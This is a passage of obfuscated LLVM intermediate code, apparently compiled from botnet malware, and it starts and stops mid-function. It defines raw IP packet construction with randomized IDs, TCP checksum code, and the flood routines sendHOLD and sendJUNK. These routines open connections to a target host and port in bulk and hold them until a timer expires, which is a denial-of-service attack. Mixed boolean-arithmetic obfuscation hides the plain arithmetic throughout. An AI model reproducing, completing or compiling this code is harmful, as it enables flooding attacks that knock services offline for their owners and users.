  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = and i8 %16, 5
  %19 = xor i8 %16, 5
  %20 = or i8 %18, %19
  %21 = or i8 %16, 5
  store i8 %20, i8* %12, align 4
  %22 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %23 = bitcast %struct.iphdr* %22 to i8*
  %24 = load i8, i8* %23, align 4
  %25 = xor i8 %24, -1
  %26 = xor i8 15, -1
  %27 = xor i8 -121, -1
  %28 = or i8 %25, %26
  %29 = or i8 -121, %27
  %30 = xor i8 %28, -1
  %31 = and i8 %30, %29
  %32 = and i8 %24, 15
  %33 = and i8 %31, 64
  %34 = xor i8 %31, 64
  %35 = or i8 %33, %34
  %36 = or i8 %31, 64
  store i8 %35, i8* %23, align 4
  %37 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %38 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %37, i32 0, i32 1
  store i8 0, i8* %38, align 1
  %39 = load i32, i32* %10, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 20, 8702425953128904996
  %42 = add i64 %41, %40
  %43 = add i64 %42, 8702425953128904996
  %44 = add i64 20, %40
  %45 = trunc i64 %43 to i16
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 2
  store i16 %45, i16* %47, align 2
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %51 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %50, i32 0, i32 3
  store i16 %49, i16* %51, align 4
  %52 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %53 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %52, i32 0, i32 4
  store i16 0, i16* %53, align 2
  %54 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 5
  store i8 -1, i8* %55, align 4
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 6
  store i8 %56, i8* %58, align 1
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 7
  store i16 0, i16* %60, align 2
  %61 = load i32, i32* %8, align 4
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 8
  store i32 %61, i32* %63, align 4
  %64 = load i32, i32* %7, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 9
  store i32 %64, i32* %66, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %287

; <label>:34:                                     ; preds = %3
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %36 = getelementptr inbounds [8 x i8], [8 x i8]* %35, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 8, i32 4, i1 false)
  %37 = load i32, i32* %7, align 4
  %38 = zext i32 %37 to i64
  %39 = call i8* @llvm.stacksave()
  store i8* %39, i8** %10, align 8
  %40 = alloca %struct.state_t, i64 %38, align 16
  %41 = bitcast %struct.state_t* %40 to i8*
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = mul i64 %43, 5
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 %44, i32 16, i1 false)
  %45 = call noalias i8* @malloc(i64 1024) #2
  store i8* %45, i8** %16, align 8
  %46 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %46, i8 0, i64 1024, i32 1, i1 false)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = load i32, i32* %6, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 %47, %49
  %51 = add nsw i32 %47, %48
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %284, %34
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %285

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %277, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %284

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %276 [
    i32 0, label %68
    i32 1, label %115
    i32 2, label %205
  ]

; <label>:68:                                     ; preds = %61
  %69 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 3, i8* null)
  %85 = and i32 %84, 2048
  %86 = xor i32 %84, 2048
  %87 = or i32 %85, %86
  %88 = or i32 %84, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %78, i32 4, i32 %87)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  br i1 %97, label %102, label %98

; <label>:98:                                     ; preds = %68
  %99 = call i32* @__errno_location() #13
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 115
  br i1 %101, label %102, label %109

; <label>:102:                                    ; preds = %98, %68
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = call i32 @close(i32 %107)
  br label %114

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %8, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %111
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %112, i32 0, i32 1
  store i8 1, i8* %113, align 4
  br label %114

; <label>:114:                                    ; preds = %109, %102
  br label %276

; <label>:115:                                    ; preds = %61
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %118 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 0
  %119 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %118) #2, !srcloc !4
  %120 = extractvalue { i64, i64* } %119, 0
  %121 = extractvalue { i64, i64* } %119, 1
  %122 = trunc i64 %120 to i32
  store i32 %122, i32* %18, align 4
  %123 = ptrtoint i64* %121 to i64
  %124 = trunc i64 %123 to i32
  store i32 %124, i32* %19, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  br label %126

; <label>:126:                                    ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = and i64 %144, %134
  %146 = xor i64 %144, %134
  %147 = or i64 %145, %146
  %148 = or i64 %144, %134
  store i64 %147, i64* %143, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %149, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %150, align 8
  %151 = load i32, i32* %8, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = sub i32 0, 1
  %157 = sub i32 %155, %156
  %158 = add nsw i32 %155, 1
  %159 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %159, i32* %15, align 4
  %160 = load i32, i32* %15, align 4
  %161 = icmp eq i32 %160, 1
  br i1 %161, label %162, label %189

; <label>:162:                                    ; preds = %126
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #2
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  br i1 %171, label %172, label %183

; <label>:172:                                    ; preds = %162
  %173 = load i32, i32* %8, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %174
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 8
  %178 = call i32 @close(i32 %177)
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %180
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %181, i32 0, i32 1
  store i8 0, i8* %182, align 4
  br label %188

; <label>:183:                                    ; preds = %162
  %184 = load i32, i32* %8, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %185
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %186, i32 0, i32 1
  store i8 2, i8* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %183, %172
  br label %204

; <label>:189:                                    ; preds = %126
  %190 = load i32, i32* %15, align 4
  %191 = icmp eq i32 %190, -1
  br i1 %191, label %192, label %203

; <label>:192:                                    ; preds = %189
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  br label %203

; <label>:203:                                    ; preds = %192, %189
  br label %204

; <label>:204:                                    ; preds = %203, %188
  br label %276

; <label>:205:                                    ; preds = %61
  br label %206

; <label>:206:                                    ; preds = %205
  %207 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %208 = getelementptr inbounds [16 x i64], [16 x i64]* %207, i64 0, i64 0
  %209 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %208) #2, !srcloc !5
  %210 = extractvalue { i64, i64* } %209, 0
  %211 = extractvalue { i64, i64* } %209, 1
  %212 = trunc i64 %210 to i32
  store i32 %212, i32* %20, align 4
  %213 = ptrtoint i64* %211 to i64
  %214 = trunc i64 %213 to i32
  store i32 %214, i32* %21, align 4
  br label %215

; <label>:215:                                    ; preds = %206
  br label %216

; <label>:216:                                    ; preds = %215
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = srem i32 %221, 64
  %223 = zext i32 %222 to i64
  %224 = shl i64 1, %223
  %225 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %226 = load i32, i32* %8, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %227
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %228, i32 0, i32 0
  %230 = load i32, i32* %229, align 8
  %231 = sdiv i32 %230, 64
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [16 x i64], [16 x i64]* %225, i64 0, i64 %232
  %234 = load i64, i64* %233, align 8
  %235 = xor i64 %234, -1
  %236 = xor i64 %224, -1
  %237 = xor i64 8301165338313975408, -1
  %238 = and i64 %235, 8301165338313975408
  %239 = and i64 %234, %237
  %240 = and i64 %236, 8301165338313975408
  %241 = and i64 %224, %237
  %242 = or i64 %238, %239
  %243 = or i64 %240, %241
  %244 = xor i64 %242, %243
  %245 = or i64 %235, %236
  %246 = xor i64 %245, -1
  %247 = or i64 8301165338313975408, %237
  %248 = and i64 %246, %247
  %249 = or i64 %244, %248
  %250 = or i64 %234, %224
  store i64 %249, i64* %233, align 8
  %251 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %251, align 8
  %252 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %252, align 8
  %253 = load i32, i32* %8, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %254
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %255, i32 0, i32 0
  %257 = load i32, i32* %256, align 8
  %258 = sub i32 0, 1
  %259 = sub i32 %257, %258
  %260 = add nsw i32 %257, 1
  %261 = call i32 @select(i32 %259, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %261, i32* %15, align 4
  %262 = load i32, i32* %15, align 4
  %263 = icmp ne i32 %262, 0
  br i1 %263, label %264, label %275

; <label>:264:                                    ; preds = %216
  %265 = load i32, i32* %8, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %266
  %268 = getelementptr inbounds %struct.state_t, %struct.state_t* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 8
  %270 = call i32 @close(i32 %269)
  %271 = load i32, i32* %8, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %272
  %274 = getelementptr inbounds %struct.state_t, %struct.state_t* %273, i32 0, i32 1
  store i8 0, i8* %274, align 4
  br label %275

; <label>:275:                                    ; preds = %264, %216
  br label %276

; <label>:276:                                    ; preds = %275, %204, %114, %61
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %8, align 4
  %279 = sub i32 0, %278
  %280 = sub i32 0, 1
  %281 = add i32 %279, %280
  %282 = sub i32 0, %281
  %283 = add nsw i32 %278, 1
  store i32 %282, i32* %8, align 4
  br label %57

; <label>:284:                                    ; preds = %57
  br label %52

; <label>:285:                                    ; preds = %52
  %286 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %286)
  br label %287

; <label>:287:                                    ; preds = %285, %33
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %266

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = sub i32 0, %45
  %48 = sub i32 0, %46
  %49 = add i32 %47, %48
  %50 = sub i32 0, %49
  %51 = add nsw i32 %45, %46
  store i32 %50, i32* %17, align 4
  br label %52

; <label>:52:                                     ; preds = %263, %32
  %53 = load i32, i32* %17, align 4
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = icmp sgt i32 %53, %54
  br i1 %55, label %56, label %264

; <label>:56:                                     ; preds = %52
  store i32 0, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %257, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %263

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %8, align 4
